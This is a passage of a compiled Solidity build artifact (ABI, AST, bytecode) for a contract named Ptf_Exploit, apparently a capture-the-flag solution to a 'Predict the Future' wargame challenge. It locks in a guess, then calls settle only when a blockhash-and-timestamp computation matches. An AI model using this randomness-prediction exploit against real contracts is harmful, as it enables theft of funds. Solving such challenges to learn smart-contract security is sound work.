{
  "abi": [
    {
      "constant": false,
      "inputs": [],
      "name": "exploit",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [
        {
          "name": "_address",
          "type": "address"
        }
      ],
      "payable": true,
      "stateMutability": "payable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    }
  ],
  "allSourcePaths": {
    "1": "contracts/Ptf_Exploit.sol"
  },
  "ast": {
    "absolutePath": "contracts/Ptf_Exploit.sol",
    "exportedSymbols": {
      "PredictTheFutureChallenge": [
        135
      ],
      "Ptf_Exploit": [
        204
      ]
    },
    "id": 205,
    "nodeType": "SourceUnit",
    "nodes": [
      {
        "id": 121,
        "literals": [
          "solidity",
          "^",
          "0.4",
          ".21"
        ],
        "nodeType": "PragmaDirective",
        "src": "0:24:1"
      },
      {
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "interface",
        "documentation": null,
        "fullyImplemented": false,
        "id": 135,
        "linearizedBaseContracts": [
          135
        ],
        "name": "PredictTheFutureChallenge",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "body": null,
            "documentation": null,
            "id": 126,
            "implemented": false,
            "isConstructor": false,
            "isDeclaredConst": true,
            "modifiers": [],
            "name": "isComplete",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 122,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "87:2:1"
            },
            "payable": false,
            "returnParameters": {
              "id": 125,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 124,
                  "name": "",
                  "nodeType": "VariableDeclaration",
                  "scope": 126,
                  "src": "113:4:1",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_bool",
                    "typeString": "bool"
                  },
                  "typeName": {
                    "id": 123,
                    "name": "bool",
                    "nodeType": "ElementaryTypeName",
                    "src": "113:4:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "112:6:1"
            },
            "scope": 135,
            "src": "68:51:1",
            "stateMutability": "view",
            "superFunction": null,
            "visibility": "external"
          },
          {
            "body": null,
            "documentation": null,
            "id": 131,
            "implemented": false,
            "isConstructor": false,
            "isDeclaredConst": false,
            "modifiers": [],
            "name": "lockInGuess",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 129,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 128,
                  "name": "n",
                  "nodeType": "VariableDeclaration",
                  "scope": 131,
                  "src": "146:7:1",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_uint8",
                    "typeString": "uint8"
                  },
                  "typeName": {
                    "id": 127,
                    "name": "uint8",
                    "nodeType": "ElementaryTypeName",
                    "src": "146:5:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint8",
                      "typeString": "uint8"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "145:9:1"
            },
            "payable": true,
            "returnParameters": {
              "id": 130,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "171:0:1"
            },
            "scope": 135,
            "src": "125:47:1",
            "stateMutability": "payable",
            "superFunction": null,
            "visibility": "external"
          },
          {
            "body": null,
            "documentation": null,
            "id": 134,
            "implemented": false,
            "isConstructor": false,
            "isDeclaredConst": false,
            "modifiers": [],
            "name": "settle",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 132,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "193:2:1"
            },
            "payable": false,
            "returnParameters": {
              "id": 133,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "204:0:1"
            },
            "scope": 135,
            "src": "178:27:1",
            "stateMutability": "nonpayable",
            "superFunction": null,
            "visibility": "external"
          }
        ],
        "scope": 205,
        "src": "26:181:1"
      },
      {
        "baseContracts": [],
        "contractDependencies": [],
        "contractKind": "contract",
        "documentation": null,
        "fullyImplemented": true,
        "id": 204,
        "linearizedBaseContracts": [
          204
        ],
        "name": "Ptf_Exploit",
        "nodeType": "ContractDefinition",
        "nodes": [
          {
            "constant": false,
            "id": 137,
            "name": "ptf",
            "nodeType": "VariableDeclaration",
            "scope": 204,
            "src": "236:29:1",
            "stateVariable": true,
            "storageLocation": "default",
            "typeDescriptions": {
              "typeIdentifier": "t_contract$_PredictTheFutureChallenge_$135",
              "typeString": "contract PredictTheFutureChallenge"
            },
            "typeName": {
              "contractScope": null,
              "id": 136,
              "name": "PredictTheFutureChallenge",
              "nodeType": "UserDefinedTypeName",
              "referencedDeclaration": 135,
              "src": "236:25:1",
              "typeDescriptions": {
                "typeIdentifier": "t_contract$_PredictTheFutureChallenge_$135",
                "typeString": "contract PredictTheFutureChallenge"
              }
            },
            "value": null,
            "visibility": "internal"
          },
          {
            "body": {
              "id": 165,
              "nodeType": "Block",
              "src": "310:143:1",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "commonType": {
                          "typeIdentifier": "t_uint256",
                          "typeString": "uint256"
                        },
                        "id": 146,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "argumentTypes": null,
                          "expression": {
                            "argumentTypes": null,
                            "id": 143,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 309,
                            "src": "328:3:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 144,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "value",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": null,
                          "src": "328:9:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "argumentTypes": null,
                          "hexValue": "31",
                          "id": 145,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "341:7:1",
                          "subdenomination": "ether",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1"
                        },
                        "src": "328:20:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      ],
                      "id": 142,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        312,
                        313
                      ],
                      "referencedDeclaration": 312,
                      "src": "320:7:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
                        "typeString": "function (bool) pure"
                      }
                    },
                    "id": 147,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "320:29:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 148,
                  "nodeType": "ExpressionStatement",
                  "src": "320:29:1"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 153,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 149,
                      "name": "ptf",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 137,
                      "src": "359:3:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_PredictTheFutureChallenge_$135",
                        "typeString": "contract PredictTheFutureChallenge"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "id": 151,
                          "name": "_address",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 139,
                          "src": "391:8:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 150,
                        "name": "PredictTheFutureChallenge",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 135,
                        "src": "365:25:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_PredictTheFutureChallenge_$135_$",
                          "typeString": "type(contract PredictTheFutureChallenge)"
                        }
                      },
                      "id": 152,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "365:35:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_PredictTheFutureChallenge_$135",
                        "typeString": "contract PredictTheFutureChallenge"
                      }
                    },
                    "src": "359:41:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_PredictTheFutureChallenge_$135",
                      "typeString": "contract PredictTheFutureChallenge"
                    }
                  },
                  "id": 154,
                  "nodeType": "ExpressionStatement",
                  "src": "359:41:1"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "hexValue": "30783035",
                        "id": 162,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "number",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "441:4:1",
                        "subdenomination": null,
                        "typeDescriptions": {
                          "typeIdentifier": "t_rational_5_by_1",
                          "typeString": "int_const 5"
                        },
                        "value": "0x05"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_rational_5_by_1",
                          "typeString": "int_const 5"
                        }
                      ],
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "hexValue": "31",
                          "id": 160,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "432:7:1",
                          "subdenomination": "ether",
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          },
                          "value": "1"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_rational_1000000000000000000_by_1",
                            "typeString": "int_const 1000000000000000000"
                          }
                        ],
                        "expression": {
                          "argumentTypes": null,
                          "expression": {
                            "argumentTypes": null,
                            "id": 155,
                            "name": "ptf",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 137,
                            "src": "410:3:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_PredictTheFutureChallenge_$135",
                              "typeString": "contract PredictTheFutureChallenge"
                            }
                          },
                          "id": 158,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "lockInGuess",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 131,
                          "src": "410:15:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_payable$_t_uint8_$returns$__$",
                            "typeString": "function (uint8) payable external"
                          }
                        },
                        "id": 159,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "value",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": null,
                        "src": "410:21:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_setvalue_nonpayable$_t_uint256_$returns$_t_function_external_payable$_t_uint8_$returns$__$value_$",
                          "typeString": "function (uint256) returns (function (uint8) payable external)"
                        }
                      },
                      "id": 161,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "410:30:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_payable$_t_uint8_$returns$__$value",
                        "typeString": "function (uint8) payable external"
                      }
                    },
                    "id": 163,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "410:36:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 164,
                  "nodeType": "ExpressionStatement",
                  "src": "410:36:1"
                }
              ]
            },
            "documentation": null,
            "id": 166,
            "implemented": true,
            "isConstructor": true,
            "isDeclaredConst": false,
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 140,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 139,
                  "name": "_address",
                  "nodeType": "VariableDeclaration",
                  "scope": 166,
                  "src": "284:16:1",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 138,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "284:7:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "283:18:1"
            },
            "payable": true,
            "returnParameters": {
              "id": 141,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "310:0:1"
            },
            "scope": 204,
            "src": "272:181:1",
            "stateMutability": "payable",
            "superFunction": null,
            "visibility": "public"
          },
          {
            "body": {
              "id": 198,
              "nodeType": "Block",
              "src": "485:172:1",
              "statements": [
                {
                  "assignments": [
                    170
                  ],
                  "declarations": [
                    {
                      "constant": false,
                      "id": 170,
                      "name": "ans",
                      "nodeType": "VariableDeclaration",
                      "scope": 199,
                      "src": "495:9:1",
                      "stateVariable": false,
                      "storageLocation": "default",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint8",
                        "typeString": "uint8"
                      },
                      "typeName": {
                        "id": 169,
                        "name": "uint8",
                        "nodeType": "ElementaryTypeName",
                        "src": "495:5:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_uint8",
                          "typeString": "uint8"
                        }
                      },
                      "value": null,
                      "visibility": "internal"
                    }
                  ],
                  "id": 185,
                  "initialValue": {
                    "argumentTypes": null,
                    "commonType": {
                      "typeIdentifier": "t_uint8",
                      "typeString": "uint8"
                    },
                    "id": 184,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "argumentTypes": null,
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "arguments": [
                            {
                              "argumentTypes": null,
                              "arguments": [
                                {
                                  "argumentTypes": null,
                                  "commonType": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  },
                                  "id": 178,
                                  "isConstant": false,
                                  "isLValue": false,
                                  "isPure": false,
                                  "lValueRequested": false,
                                  "leftExpression": {
                                    "argumentTypes": null,
                                    "expression": {
                                      "argumentTypes": null,
                                      "id": 175,
                                      "name": "block",
                                      "nodeType": "Identifier",
                                      "overloadedDeclarations": [],
                                      "referencedDeclaration": 299,
                                      "src": "539:5:1",
                                      "typeDescriptions": {
                                        "typeIdentifier": "t_magic_block",
                                        "typeString": "block"
                                      }
                                    },
                                    "id": 176,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": false,
                                    "lValueRequested": false,
                                    "memberName": "number",
                                    "nodeType": "MemberAccess",
                                    "referencedDeclaration": null,
                                    "src": "539:12:1",
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_uint256",
                                      "typeString": "uint256"
                                    }
                                  },
                                  "nodeType": "BinaryOperation",
                                  "operator": "-",
                                  "rightExpression": {
                                    "argumentTypes": null,
                                    "hexValue": "31",
                                    "id": 177,
                                    "isConstant": false,
                                    "isLValue": false,
                                    "isPure": true,
                                    "kind": "number",
                                    "lValueRequested": false,
                                    "nodeType": "Literal",
                                    "src": "554:1:1",
                                    "subdenomination": null,
                                    "typeDescriptions": {
                                      "typeIdentifier": "t_rational_1_by_1",
                                      "typeString": "int_const 1"
                                    },
                                    "value": "1"
                                  },
                                  "src": "539:16:1",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                }
                              ],
                              "expression": {
                                "argumentTypes": [
                                  {
                                    "typeIdentifier": "t_uint256",
                                    "typeString": "uint256"
                                  }
                                ],
                                "expression": {
                                  "argumentTypes": null,
                                  "id": 173,
                                  "name": "block",
                                  "nodeType": "Identifier",
                                  "overloadedDeclarations": [],
                                  "referencedDeclaration": 299,
                                  "src": "523:5:1",
                                  "typeDescriptions": {
                                    "typeIdentifier": "t_magic_block",
                                    "typeString": "block"
                                  }
                                },
                                "id": 174,
                                "isConstant": false,
                                "isLValue": false,
                                "isPure": false,
                                "lValueRequested": false,
                                "memberName": "blockhash",
                                "nodeType": "MemberAccess",
                                "referencedDeclaration": null,
                                "src": "523:15:1",
                                "typeDescriptions": {
                                  "typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
                                  "typeString": "function (uint256) view returns (bytes32)"
                                }
                              },
                              "id": 179,
                              "isConstant": false,
                              "isLValue": false,
                              "isPure": false,
                              "kind": "functionCall",
                              "lValueRequested": false,
                              "names": [],
                              "nodeType": "FunctionCall",
                              "src": "523:33:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_bytes32",
                                "typeString": "bytes32"
                              }
                            },
                            {
                              "argumentTypes": null,
                              "id": 180,
                              "name": "now",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 311,
                              "src": "558:3:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            }
                          ],
                          "expression": {
                            "argumentTypes": [
                              {
                                "typeIdentifier": "t_bytes32",
                                "typeString": "bytes32"
                              },
                              {
                                "typeIdentifier": "t_uint256",
                                "typeString": "uint256"
                              }
                            ],
                            "id": 172,
                            "name": "keccak256",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 303,
                            "src": "513:9:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_sha3_pure$__$returns$_t_bytes32_$",
                              "typeString": "function () pure returns (bytes32)"
                            }
                          },
                          "id": 181,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "513:49:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_bytes32",
                            "typeString": "bytes32"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_bytes32",
                            "typeString": "bytes32"
                          }
                        ],
                        "id": 171,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "ElementaryTypeNameExpression",
                        "src": "507:5:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_uint8_$",
                          "typeString": "type(uint8)"
                        },
                        "typeName": "uint8"
                      },
                      "id": 182,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "507:56:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint8",
                        "typeString": "uint8"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "%",
                    "rightExpression": {
                      "argumentTypes": null,
                      "hexValue": "3130",
                      "id": 183,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "number",
                      "lValueRequested": false,
                      "nodeType": "Literal",
                      "src": "578:2:1",
                      "subdenomination": null,
                      "typeDescriptions": {
                        "typeIdentifier": "t_rational_10_by_1",
                        "typeString": "int_const 10"
                      },
                      "value": "10"
                    },
                    "src": "507:73:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_uint8",
                      "typeString": "uint8"
                    }
                  },
                  "nodeType": "VariableDeclarationStatement",
                  "src": "495:85:1"
                },
                {
                  "condition": {
                    "argumentTypes": null,
                    "commonType": {
                      "typeIdentifier": "t_uint8",
                      "typeString": "uint8"
                    },
                    "id": 190,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftExpression": {
                      "argumentTypes": null,
                      "id": 186,
                      "name": "ans",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 170,
                      "src": "594:3:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint8",
                        "typeString": "uint8"
                      }
                    },
                    "nodeType": "BinaryOperation",
                    "operator": "==",
                    "rightExpression": {
                      "argumentTypes": null,
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "hexValue": "30783035",
                          "id": 188,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": true,
                          "kind": "number",
                          "lValueRequested": false,
                          "nodeType": "Literal",
                          "src": "607:4:1",
                          "subdenomination": null,
                          "typeDescriptions": {
                            "typeIdentifier": "t_rational_5_by_1",
                            "typeString": "int_const 5"
                          },
                          "value": "0x05"
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_rational_5_by_1",
                            "typeString": "int_const 5"
                          }
                        ],
                        "id": 187,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "lValueRequested": false,
                        "nodeType": "ElementaryTypeNameExpression",
                        "src": "601:5:1",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_uint8_$",
                          "typeString": "type(uint8)"
                        },
                        "typeName": "uint8"
                      },
                      "id": 189,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": true,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "601:11:1",
                      "typeDescriptions": {
                        "typeIdentifier": "t_uint8",
                        "typeString": "uint8"
                      }
                    },
                    "src": "594:18:1",
                    "typeDescriptions": {
                      "typeIdentifier": "t_bool",
                      "typeString": "bool"
                    }
                  },
                  "falseBody": null,
                  "id": 197,
                  "nodeType": "IfStatement",
                  "src": "590:61:1",
                  "trueBody": {
                    "id": 196,
                    "nodeType": "Block",
                    "src": "614:37:1",
                    "statements": [
                      {
                        "expression": {
                          "argumentTypes": null,
                          "arguments": [],
                          "expression": {
                            "argumentTypes": [],
                            "expression": {
                              "argumentTypes": null,
                              "id": 191,
                              "name": "ptf",
                              "nodeType": "Identifier",
                              "overloadedDeclarations": [],
                              "referencedDeclaration": 137,
                              "src": "628:3:1",
                              "typeDescriptions": {
                                "typeIdentifier": "t_contract$_PredictTheFutureChallenge_$135",
                                "typeString": "contract PredictTheFutureChallenge"
                              }
                            },
                            "id": 193,
                            "isConstant": false,
                            "isLValue": false,
                            "isPure": false,
                            "lValueRequested": false,
                            "memberName": "settle",
                            "nodeType": "MemberAccess",
                            "referencedDeclaration": 134,
                            "src": "628:10:1",
                            "typeDescriptions": {
                              "typeIdentifier": "t_function_external_nonpayable$__$returns$__$",
                              "typeString": "function () external"
                            }
                          },
                          "id": 194,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "kind": "functionCall",
                          "lValueRequested": false,
                          "names": [],
                          "nodeType": "FunctionCall",
                          "src": "628:12:1",
                          "typeDescriptions": {
                            "typeIdentifier": "t_tuple$__$",
                            "typeString": "tuple()"
                          }
                        },
                        "id": 195,
                        "nodeType": "ExpressionStatement",
                        "src": "628:12:1"
                      }
                    ]
                  }
                }
              ]
            },
            "documentation": null,
            "id": 199,
            "implemented": true,
            "isConstructor": false,
            "isDeclaredConst": false,
            "modifiers": [],
            "name": "exploit",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 167,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "475:2:1"
            },
            "payable": false,
            "returnParameters": {
              "id": 168,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "485:0:1"
            },
            "scope": 204,
            "src": "459:198:1",
            "stateMutability": "nonpayable",
            "superFunction": null,
            "visibility": "public"
          },
          {
            "body": {
              "id": 202,
              "nodeType": "Block",
              "src": "691:2:1",
              "statements": []
            },
            "documentation": null,
            "id": 203,
            "implemented": true,
            "isConstructor": false,
            "isDeclaredConst": false,
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "parameters": {
              "id": 200,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "671:2:1"
            },
            "payable": true,
            "returnParameters": {
              "id": 201,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "691:0:1"
            },
            "scope": 204,
            "src": "663:30:1",
            "stateMutability": "payable",
            "superFunction": null,
            "visibility": "external"
          }
        ],
        "scope": 205,
        "src": "209:486:1"
      }
    ],
    "src": "0:696:1"
  },
  "bytecode": "60806040526040516020806102058339810160405251670de0b6b3a7640000341461002957600080fd5b60008054600160a060020a031916600160a060020a0383811691909117808355604080517f2c0e00540000000000000000000000000000000000000000000000000000000081526005600482015290519190921692632c0e005492670de0b6b3a7640000926024808301939282900301818588803b1580156100aa57600080fd5b505af11580156100be573d6000803e3d6000fd5b505050505050610132806100d36000396000f3006080604052600436106100405763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166363d9b7708114610042575b005b34801561004e57600080fd5b50604080516000194301408152426020820152815190819003909101902061004090600a60ff91821606908116600514156101035760008054604080517f11da60b4000000000000000000000000000000000000000000000000000000008152905173ffffffffffffffffffffffffffffffffffffffff909216926311da60b49260048084019382900301818387803b1580156100ea57600080fd5b505af11580156100fe573d6000803e3d6000fd5b505050505b505600a165627a7a72305820cc375aaf81bd0056f8f858188d0a7be79226c3382fe12a1bc6f78a6f7d44ece10029",
  "bytecodeSha1": "7714085ee4aef11ffe2d85e14933cc4621362162",
  "compiler": {
    "evm_version": "byzantium",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.4.26+commit.4563c3fc"
  },
  "contractName": "Ptf_Exploit",
  "coverageMap": {
    "branches": {
      "1": {
        "Ptf_Exploit.exploit": {
          "1": [
            594,
            612,
            false
          ]
        }
      }
    },
    "statements": {
      "1": {
        "Ptf_Exploit.exploit": {
          "0": [
            628,
            640
          ]
        }
      }
    }
  },
  "dependencies": [
    "PredictTheFutureChallenge"
  ],
  "deployedBytecode": "6080604052600436106100405763ffffffff7c010000000000000000000000000000000000000000000000000000000060003504166363d9b7708114610042575b005b34801561004e57600080fd5b50604080516000194301408152426020820152815190819003909101902061004090600a60ff91821606908116600514156101035760008054604080517f11da60b4000000000000000000000000000000000000000000000000000000008152905173ffffffffffffffffffffffffffffffffffffffff909216926311da60b49260048084019382900301818387803b1580156100ea57600080fd5b505af11580156100fe573d6000803e3d6000fd5b505050505b505600a165627a7a72305820cc375aaf81bd0056f8f858188d0a7be79226c3382fe12a1bc6f78a6f7d44ece10029",
  "deployedSourceMap": "209:486:1:-;;;;;;;;;;;;;;;;;;;;;459:198;;8:9:-1;5:2;;;30:1;27;20:12;5:2;-1:-1;513:49:1;;;-1:-1:-1;;539:12:1;:16;523:33;513:49;;558:3;513:49;;;;;;;;;;;;;;;459:198;;578:2;507:73;;;;;;594:18;;607:4;594:18;590:61;;;628:3;;;:12;;;;;;;;:3;;;;;:10;;:12;;;;;;;;;;:3;;:12;;;5:2:-1;;;;30:1;27;20:12;5:2;628:12:1;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;628:12:1;;;;590:61;459:198;:::o",
  "language": "Solidity",
  "natspec": {
    "methods": {}
  },
  "offset": [
    209,
    695
  ],
